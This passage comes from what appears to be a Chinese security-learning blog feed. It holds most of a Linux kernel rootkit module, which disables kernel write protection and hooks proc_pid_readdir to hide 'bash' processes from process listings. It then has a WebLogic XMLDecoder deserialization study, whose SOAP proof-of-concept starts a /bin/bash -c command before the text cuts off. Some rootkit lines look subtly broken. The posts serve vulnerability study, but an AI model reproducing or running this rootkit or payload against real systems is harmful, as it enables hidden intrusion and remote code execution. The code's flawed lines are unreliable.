class="title">int</span> <span class="params">(*origin_proc_pid_readdir_point)</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span>;</span><br><span class="line">origin_proc_pid_readdir_point origin_proc_pid_readdir;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_addr_rw</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cr0 = read_cr0();</span><br><span class="line">clear_bit(<span class="number">16</span>, &amp;cr0);</span><br><span class="line">write_cr0(cr0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_addr_ro</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cr0 = read_cr0();</span><br><span class="line">set_bit(<span class="number">16</span>, &amp;cr0);</span><br><span class="line">write_cr0(cr0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tgid_iter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tgid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">new_has_pid_permissions</span><span class="params">(struct pid_namespace *pid,</span></span></span><br><span class="line"><span class="function"><span class="params">struct task_struct *task,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> hide_pid_min)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">new_ptrace_may_access = (hack_ptrace_may_access)kallsyms_lookup_name(<span class="string">"ptrace_may_access"</span>);</span><br><span class="line"><span class="keyword">if</span> (!new_proc_fill_cache)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"ptrace_may_access err;"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pid-&gt;hide_pid &lt; hide_pid_min)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span> (in_group_p(pid-&gt;pid_gid))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> new_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_proc_pid_readdir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">new_next_tgid = (hack_next_tgid)kallsyms_lookup_name(<span class="string">"next_tgid"</span>);</span><br><span class="line"><span class="keyword">if</span> (!new_next_tgid)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"next_tgid err;"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">new_proc_fill_cache = (hack_proc_fill_cache)kallsyms_lookup_name(<span class="string">"proc_fill_cache"</span>);</span><br><span class="line"><span class="keyword">if</span> (!new_proc_fill_cache)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"proc_fill_cache err;"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">new_proc_pid_instantiate = (hack_proc_pid_instantiate)kallsyms_lookup_name(<span class="string">"proc_pid_instantiate"</span>);</span><br><span class="line"><span class="keyword">if</span> (!new_proc_pid_instantiate)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"proc_pid_instantiate err;"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tgid_iter</span> <span class="title">iter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">ns</span> = <span class="title">file_inode</span>(<span class="title">file</span>)-&gt;<span class="title">i_sb</span>-&gt;<span class="title">s_fs_info</span>;</span></span><br><span class="line"><span class="keyword">loff_t</span> pos = ctx-&gt;pos;</span><br><span class="line"><span class="keyword">if</span> (pos &gt;= PID_MAX_LIMIT + TGID_OFFSET)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (pos == TGID_OFFSET - <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">d_inode</span>(<span class="title">ns</span>-&gt;<span class="title">proc_self</span>);</span></span><br><span class="line"><span class="keyword">if</span> (!dir_emit(ctx, <span class="string">"self"</span>, <span class="number">4</span>, inode-&gt;i_ino, DT_LNK))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">ctx-&gt;pos = pos = pos + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pos == TGID_OFFSET - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">d_inode</span>(<span class="title">ns</span>-&gt;<span class="title">proc_thread_self</span>);</span></span><br><span class="line"><span class="keyword">if</span> (!dir_emit(ctx, <span class="string">"thread-self"</span>, <span class="number">11</span>, inode-&gt;i_ino, DT_LNK))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">ctx-&gt;pos = pos = pos + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">iter.tgid = pos - TGID_OFFSET;</span><br><span class="line">iter.task = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (iter = new_next_tgid(ns, iter);</span><br><span class="line"> iter.task;</span><br><span class="line"> iter.tgid += <span class="number">1</span>, iter = new_next_tgid(ns, iter))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> name[PROC_NUMBUF];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line">cond_resched();</span><br><span class="line"><span class="keyword">if</span> (!new_has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">len = <span class="built_in">snprintf</span>(name, <span class="keyword">sizeof</span>(name), <span class="string">"%d"</span>, iter.tgid);</span><br><span class="line">ctx-&gt;pos = iter.tgid + TGID_OFFSET;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"bash"</span>, iter.task-&gt;comm) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"Hidden process is [tgid:%d][pid:%d]:%s\n"</span>, ctx-&gt;pos, iter.task-&gt;pid, iter.task-&gt;comm);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!new_proc_fill_cache(file, ctx, name, len,</span><br><span class="line"> new_proc_pid_instantiate, iter.task, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">put_task_struct(iter.task);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;pos = PID_MAX_LIMIT + TGID_OFFSET;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">create_tramp</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *src, <span class="keyword">unsigned</span> <span class="keyword">long</span> *new_func, <span class="keyword">unsigned</span> <span class="keyword">int</span> id, <span class="keyword">unsigned</span> <span class="keyword">int</span> h_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(<span class="string">"[goof] hooking %p with %p\n"</span>, src, new_func);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hook</span> *<span class="title">h</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">Hook</span>), <span class="title">GFP_KERNEL</span>);</span></span><br><span class="line">hooks[id] = h;</span><br><span class="line">h-&gt;og_func = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src;</span><br><span class="line">h-&gt;new_func = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)new_func;</span><br><span class="line">h-&gt;hook_len = h_len;</span><br><span class="line">h-&gt;original_code = kmalloc(h-&gt;hook_len, GFP_KERNEL);</span><br><span class="line"><span class="built_in">memcpy</span>(h-&gt;original_code, src, h-&gt;hook_len);</span><br><span class="line">h-&gt;trampoline = __vmalloc(h-&gt;hook_len + HOOK_LEN, GFP_KERNEL, PAGE_KERNEL_EXEC);</span><br><span class="line"><span class="built_in">memcpy</span>(h-&gt;trampoline, h-&gt;original_code, h-&gt;hook_len);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *jump_back = kmalloc(HOOK_LEN, GFP_KERNEL);</span><br><span class="line"><span class="built_in">memcpy</span>(jump_back, JUMP_TEMPLATE, HOOK_LEN);</span><br><span class="line">tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)src + h-&gt;hook_len;</span><br><span class="line"><span class="built_in">memcpy</span>(jump_back + <span class="number">2</span>, &amp;tmp, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(h-&gt;trampoline + h-&gt;hook_len, jump_back, HOOK_LEN);</span><br><span class="line">kfree(jump_back);</span><br><span class="line">printk(<span class="string">"\n[goof] trampoline %p\n\t[goof] "</span>, h-&gt;trampoline);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; h-&gt;hook_len * <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"%02x "</span>, h-&gt;trampoline[i]);</span><br><span class="line">&#125;</span><br><span class="line">printk(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *jump = kmalloc(h-&gt;hook_len, GFP_KERNEL);</span><br><span class="line"><span class="built_in">memset</span>(jump, <span class="number">0x90</span>, h-&gt;hook_len);</span><br><span class="line"><span class="built_in">memcpy</span>(jump, JUMP_TEMPLATE, HOOK_LEN);</span><br><span class="line">tmp = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)new_func);</span><br><span class="line"><span class="built_in">memcpy</span>(jump + <span class="number">2</span>, &amp;tmp, <span class="number">8</span>);</span><br><span class="line">printk(<span class="string">"[goof] Memory hasn't been written\n"</span>);</span><br><span class="line">set_addr_rw();</span><br><span class="line"><span class="built_in">memcpy</span>(src, jump, h-&gt;hook_len);</span><br><span class="line">set_addr_ro();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">number_of_bytes_to_pad_jump</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">DISASM MyDisasm;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> Error = <span class="number">0</span>;</span><br><span class="line">(<span class="keyword">void</span>)<span class="built_in">memset</span>(&amp;MyDisasm, <span class="number">0</span>, <span class="keyword">sizeof</span>(DISASM));</span><br><span class="line">MyDisasm.EIP = src;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">12</span> &amp;&amp; res &lt; HOOK_LEN; i++)</span><br><span class="line">&#123;</span><br><span class="line">len = Disasm(&amp;MyDisasm);</span><br><span class="line">printk(<span class="string">"len: %d\n"</span>, len);</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">&#123;</span><br><span class="line">printk(<span class="string">"%02x "</span>, *(((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)MyDisasm.EIP) + j));</span><br><span class="line">&#125;</span><br><span class="line">res += len;</span><br><span class="line">MyDisasm.EIP = MyDisasm.EIP + len;</span><br><span class="line"></span><br><span class="line">printk(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_tramp</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">set_addr_rw();</span><br><span class="line"><span class="built_in">memcpy</span>(hooks[id]-&gt;og_func, hooks[id]-&gt;original_code, hooks[id]-&gt;hook_len);</span><br><span class="line">set_addr_ro();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">hack_kernel</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hook_offset;</span><br><span class="line">hooks = kmalloc(<span class="keyword">sizeof</span>(struct Hook *) * HOOKS_COUNT, GFP_KERNEL);</span><br><span class="line"><span class="keyword">int</span> padding_size = number_of_bytes_to_pad_jump(<span class="string">"proc_pid_readdir"</span>);</span><br><span class="line">origin_proc_pid_readdir = kallsyms_lookup_name(<span class="string">"proc_pid_readdir"</span>);</span><br><span class="line">create_tramp((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)origin_proc_pid_readdir, (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)new_proc_pid_readdir, <span class="number">0</span>, padding_size);</span><br><span class="line">printk(<span class="string">"Hooked uname with %d bytes\n\n"</span>, padding_size);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">hack_kernel_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">remove_tramp(<span class="number">0</span>);</span><br><span class="line">printk(<span class="string">"hack kernel goodbye!!"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">module_init(hack_kernel);</span><br><span class="line">module_exit(hack_kernel_exit)</span><br></pre></td></tr></table></figure><p>内核 4.15 + gcc 8.4 测试通过。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最基础的几种 hook 方式，后面还有很多。主要参考&lt;a href=&quot;https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>weblogic 10.3.6 XMLDecoder 反序列化漏洞学习</title>
    <link href="http://yoursite.com/2020/07/07/weblogic-10-3-6-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/07/07/weblogic-10-3-6-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-07-06T16:55:03.000Z</published>
    <updated>2020-07-18T15:12:00.172Z</updated>
    
    <content type="html"><![CDATA[<p>文章整体学习于 <a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704" target="_blank" rel="noopener">奇安信 WebLogic 安全研究报告</a></p><h2 id="sax-解析-xml-基础"><a href="#sax-解析-xml-基础" class="headerlink" title="sax 解析 xml 基础"></a>sax 解析 xml 基础</h2><p>java 在使用 sax 处理 xml 时，采用事件进行处理，那我们我们需要关注有哪些事件。<br>事件源有 4 种：ContentHandler,DTDHandler,ErrorHandler,以及 EntityResolver。<br>处理内容的事件源是 ContentHandler，看一下他的事件（<a href="http://www.saxproject.org/apidoc/org/xml/sax/ContentHandler.html" target="_blank" rel="noopener">截图来源</a>）：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/396790baee89469ea39fea0cf604cfd02.png" alt="396790baee89469ea39fea0cf604cfd02"><br><a href="https://www.ibm.com/developerworks/cn/xml/x-saxhandle/index.html" target="_blank" rel="noopener">中文文档</a><br>引用一张图（<a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">来源</a>）：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/396790baee89469ea39fea0cf604cfd01.png" alt="396790baee89469ea39fea0cf604cfd01"><br>根据头部文章的说明及其调试，xml 反序列化流程会先进入 DocumentHandler，对各类事件源进行处理，同时在处理的过程中再分发到相关的标签 ElementHandler。看一下 DocumentHandler 的处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据标签添加各种标签ElementHandler。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DocumentHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"java"</span>, JavaElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"null"</span>, NullElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"array"</span>, ArrayElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//开始解析各种标签</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String var1, String var2, String var3, Attributes var4)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">//保存上一级ElementHandler对象，通过setParent保存在this.parent中</span></span><br><span class="line">ElementHandler var5 = <span class="keyword">this</span>.handler;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//根据标签名，通过getElementHandler获取保存的各类ElementHandler。</span></span><br><span class="line">            <span class="keyword">this</span>.handler = (ElementHandler)<span class="keyword">this</span>.getElementHandler(var3).newInstance();</span><br><span class="line">            <span class="keyword">this</span>.handler.setOwner(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">this</span>.handler.setParent(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SAXException(var10);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//遍历各类属性，通过addAttribute进行保存设置。</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var4.getLength(); ++var6) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取属性名字和属性值。</span></span><br><span class="line">                String var7 = var4.getQName(var6);</span><br><span class="line">                String var8 = var4.getValue(var6);</span><br><span class="line">                <span class="keyword">this</span>.handler.addAttribute(var7, var8);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">                <span class="keyword">this</span>.handleException(var9);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//调用ElementHandler的startElement。</span></span><br><span class="line">        <span class="keyword">this</span>.handler.startElement();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//结束标签解析</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String var1, String var2, String var3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//直接调用ElementHandler的endElement</span></span><br><span class="line">            <span class="keyword">this</span>.handler.endElement();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var8) &#123;</span><br><span class="line">            <span class="keyword">this</span>.handleException(var8);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.handler = <span class="keyword">this</span>.handler.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>object 标签和 void 标签基本都是 ObjectElementHandler 处理的，ObjectElementHandler 继承于 NewElementHandler，他的特点是可以保存 argument 和 type 值，argument 为保存的参数，type 为当前的对象。分析一下 ObjectElemtHandler 的 getValueObject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.field != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(FieldElementHandler.getFieldValue(<span class="keyword">this</span>.getContextBean(), <span class="keyword">this</span>.field));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.idref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(<span class="keyword">this</span>.getVariable(<span class="keyword">this</span>.idref));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//获取上下文环境，如果当前对象设置了type值，则上下文环境为type设置的对象，如果没有设置，</span></span><br><span class="line"><span class="comment">//则取上一层标签的值对象作为上下文环境，及调用上一层的getValueObject()</span></span><br><span class="line">            Object var3 = <span class="keyword">this</span>.getContextBean();</span><br><span class="line">            String var4;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.index != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">2</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.property != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">1</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="keyword">this</span>.property.length()) &#123;</span><br><span class="line">                    var4 = var4 + <span class="keyword">this</span>.property.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + <span class="keyword">this</span>.property.substring(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = <span class="keyword">this</span>.method != <span class="keyword">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="keyword">this</span>.method.length() ? <span class="keyword">this</span>.method : <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//expression是一个反射封装，var3为object，var4为method，var2为arguments。</span></span><br><span class="line">            Expression var5 = <span class="keyword">new</span> Expression(var3, var4, var2);</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再看一下 ElementHandler 的 endElement 方法，只要处理标签没有重写 endElement，都会默认调用 ElementHandler 的这个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//获取当前标签的值。</span></span><br><span class="line">        ValueObject var1 = <span class="keyword">this</span>.getValueObject();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isVoid()) &#123;</span><br><span class="line"><span class="comment">//设置为环境变量值？？？</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.id != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.owner.setVariable(<span class="keyword">this</span>.id, var1.getValue());</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//是否作为参数值进行传递。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.isArgument()) &#123;</span><br><span class="line"><span class="comment">//说明如果可以作为参数进行传递且存在上一层标签，则上一层必须支持参数传递。</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.parent.addArgument(var1.getValue());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.owner.addObject(var1.getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="POC1-分析"><a href="#POC1-分析" class="headerlink" title="POC1 分析"></a>POC1 分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入口：/wls-wsat/CoordinatorPortType</span></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">      &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">          &lt;java&gt;</span><br><span class="line">            &lt;object <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">              &lt;array <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.String"</span> length=<span class="string">"3"</span>&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"0"</span>&gt;</span><br><span class="line">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"1"</span>&gt;</span><br><span class="line">                  &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"2"</span>&gt;</span><br><span class="line">                  &lt;string&gt;ping 